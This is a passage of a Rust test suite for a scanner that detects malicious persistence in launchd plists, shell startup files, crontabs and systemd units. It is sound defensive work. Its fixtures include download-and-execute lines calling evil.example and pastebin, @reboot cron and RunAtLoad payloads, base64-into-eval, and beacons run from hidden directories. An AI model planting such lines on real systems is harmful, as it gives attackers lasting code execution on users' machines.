    <string>/bin/sh</string><string>-c</string>
    <string>curl -fsSL https://evil.example/x.sh | sh</string>
  </array>
  <key>RunAtLoad</key><true/>
</dict></plist>"#;
        let findings = scan("Library/LaunchAgents/com.example.sync.plist", plist);
        assert!(
            findings.iter().any(
                |f| f.rule_id.as_deref() == Some("PERSIST_LAUNCHD_DOWNLOAD_EXEC")
                    && f.severity == Severity::Critical
            ),
            "a curl|sh launch agent must be critical: {findings:?}"
        );
    }

    #[test]
    fn zshrc_with_base64_eval_is_flagged() {
        let findings = scan(".zshrc", &shell_rc("eval \"$(echo aG9zdA== | base64 -d)\""));
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("PERSIST_SHELLRC_DECODE_EXEC")),
            "base64 piped into eval must be flagged: {findings:?}"
        );
    }

    #[test]
    fn bashrc_with_curl_pipe_sh_is_critical() {
        let findings = scan(
            ".bashrc",
            &shell_rc("curl -fsSL https://pastebin.com/raw/abc | bash"),
        );
        assert!(
            findings.iter().any(
                |f| f.rule_id.as_deref() == Some("PERSIST_SHELLRC_DOWNLOAD_EXEC")
                    && f.severity == Severity::Critical
            ),
            "curl|bash in .bashrc must be critical: {findings:?}"
        );
    }

    #[test]
    fn zprofile_reinstalling_a_launch_agent_is_flagged() {
        let findings = scan(
            ".zprofile",
            &shell_rc("launchctl load ~/Library/LaunchAgents/com.foo.agent.plist"),
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("PERSIST_SHELLRC_LAUNCHCTL_LOAD")),
            "launchctl load in a shell rc must be flagged: {findings:?}"
        );
    }

    #[test]
    fn reboot_cron_entry_downloading_code_is_critical() {
        let findings = scan(
            "crontab",
            "PATH=/usr/bin\n@reboot curl -s https://evil.example/b | sh\n",
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("PERSIST_CRON_DOWNLOAD_EXEC")),
            "@reboot curl|sh must be critical: {findings:?}"
        );
    }

    #[test]
    fn frequent_cron_entry_from_hidden_dir_is_flagged() {
        let findings = scan("crontab", "*/5 * * * * /home/u/.cache/.svc/beacon --once\n");
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("PERSIST_CRON_HIDDEN_EXEC")),
            "a five-minute cron beacon from a hidden dir must be flagged: {findings:?}"
        );
    }

    #[test]
    fn systemd_unit_running_from_tmp_is_flagged() {
        let unit = "[Unit]\nDescription=Thing\n\n[Service]\nExecStart=/tmp/.x/svc --run\n";
        let findings = scan(".config/systemd/user/thing.service", unit);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("PERSIST_SYSTEMD_HIDDEN_EXEC")),
            "ExecStart from /tmp must be flagged: {findings:?}"
        );
    }

    // ── TRUE NEGATIVES ────────────────────────────────────────────────────

    #[test]
    fn a_normal_launch_agent_is_clean() {
        let plist = r#"<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
  <key>Label</key><string>com.example.backup</string>
  <key>ProgramArguments</key>
  <array>
    <string>/usr/local/bin/restic</string>
    <string>backup</string><string>/Users/me</string>
  </array>
  <key>RunAtLoad</key><true/>
</dict></plist>"#;
        let findings = scan("Library/LaunchAgents/com.example.backup.plist", plist);
        assert!(
            findings.is_empty(),
            "an agent running an installed binary must not fire: {findings:?}"
        );
    }

    #[test]
    fn a_normal_zshrc_is_clean() {
        let findings = scan(
            ".zshrc",
            "export EDITOR=vim\nalias gs='git status'\neval \"$(/opt/homebrew/bin/brew shellenv)\"\n",
        );
        assert!(
            findings.is_empty(),
            "ordinary shell customisation must not fire: {findings:?}"
        );
    }

    #[test]
    fn commented_out_payload_is_ignored() {
        let findings = scan(
            ".zshrc",
            "# curl -fsSL https://evil.example/x.sh | bash\nexport FOO=1\n",
        );
        assert!(
            findings.is_empty(),
            "a commented-out line must not fire: {findings:?}"
        );
    }

    #[test]
    fn a_normal_crontab_is_clean() {
        let findings = scan(
            "crontab",
            "SHELL=/bin/bash\n0 3 * * * /usr/local/bin/backup.sh\n@daily /usr/bin/updatedb\n",
        );
        assert!(
            findings.is_empty(),
            "ordinary cron jobs must not fire: {findings:?}"
        );
    }

    #[test]
    fn unrelated_files_are_ignored() {
        let files = vec![
            unit("package.json", "{\"name\":\"x\"}"),
            unit("src/index.js", "curl('https://x')"),
            unit(
                "Library/Preferences/com.foo.plist",
                "<plist><dict><key>Program</key><string>/tmp/.x/b</string></dict></plist>",
            ),
        ];
        let config = crate::config::ScanConfig::default();
        let ctx = ScanContext {
            target_name: "test".to_owned(),
            files: &files,
            package_json: None,
            config: &config,
        };
        assert!(PersistenceEngine.scan(&ctx).is_empty());
    }

    #[test]
    fn binary_plist_is_skipped() {
        let findings = scan(
            "Library/LaunchAgents/com.foo.plist",
            "bplist00\u{1}\u{2}\u{3} /tmp/.x/beacon",
        );
        assert!(
            findings.is_empty(),
            "a binary plist cannot be parsed and must not fire: {findings:?}"
        );
    }

    // ── Helpers ───────────────────────────────────────────────────────────

    #[test]
    fn suspicious_path_detection() {
        assert!(is_suspicious_exec_path("/tmp/.hidden/beacon"));
        assert!(is_suspicious_exec_path("/Users/me/.cache/.svc/beacon"));
        assert!(is_suspicious_exec_path("/Users/me/.updater/payload"));
        assert!(is_suspicious_exec_path("/var/tmp/x"));
        assert!(!is_suspicious_exec_path("/usr/local/bin/restic"));
        assert!(!is_suspicious_exec_path(
            "/Applications/Thing.app/Contents/MacOS/Thing"
        ));
        // Ordinary dot-directory tooling is NOT suspicious: these are where
        // user-installed binaries normally live.
        assert!(!is_suspicious_exec_path("/Users/me/.local/bin/foo"));
        assert!(!is_suspicious_exec_path("/home/u/.cargo/bin/rg"));
        assert!(!is_suspicious_exec_path("/home/u/.cache/svc/beacon"));
    }

    #[test]
    fn classification_is_path_driven() {
        assert_eq!(
            classify("Library/LaunchAgents/a.plist"),
            Some(TargetKind::LaunchAgent)
        );
        assert_eq!(
            classify("Library/LaunchDaemons/a.plist"),
            Some(TargetKind::LaunchAgent)
        );
        assert_eq!(classify("Library/LaunchAgents/a.txt"), None);
        assert_eq!(classify(".zshrc"), Some(TargetKind::ShellStartup));
        assert_eq!(classify("/home/u/.bashrc"), Some(TargetKind::ShellStartup));
        assert_eq!(classify("crontab"), Some(TargetKind::Crontab));
        assert_eq!(classify("etc/cron.d/backup"), Some(TargetKind::Crontab));
        assert_eq!(
            classify(".config/systemd/user/a.service"),
            Some(TargetKind::SystemdUnit)
        );
        assert_eq!(
            classify(".config/fish/config.fish"),
            Some(TargetKind::ShellStartup)
        );
        assert_eq!(
            classify(".config/autostart/updater.desktop"),
            Some(TargetKind::DesktopAutostart)
        );
        assert_eq!(classify("src/main.rs"), None);
    }

    #[test]
    fn rule_budget_caps_each_rule_per_file() {
        let mut budget = RuleBudget::default();
        assert!(budget.allow("R1"));
        assert!(budget.allow("R1"));
        assert!(budget.allow("R1"));
        assert!(!budget.allow("R1"), "the fourth emission must be dropped");
        assert!(budget.allow("R2"), "a different rule has its own budget");
    }

    #[test]
    fn frequent_schedule_detection() {
        assert!(is_frequent_schedule("*/5 * * * * /bin/x"));
        assert!(is_frequent_schedule("* * * * * /bin/x"));
        assert!(!is_frequent_schedule("0 3 * * * /bin/x"));
        assert!(!is_frequent_schedule("@daily /bin/x"));
    }

    #[test]
    fn inline_script_detection_needs_a_suspicious_body() {
        assert!(is_inline_script_exec(
            "/bin/bash",
            &["-c".to_owned(), "curl https://x | sh".to_owned()]
        ));
        assert!(!is_inline_script_exec(
            "/bin/bash",
            &["-c".to_owned(), "echo hello".to_owned()]
        ));
        assert!(!is_inline_script_exec(
            "/usr/local/bin/restic",
            &["backup".to_owned()]
        ));
    }
}
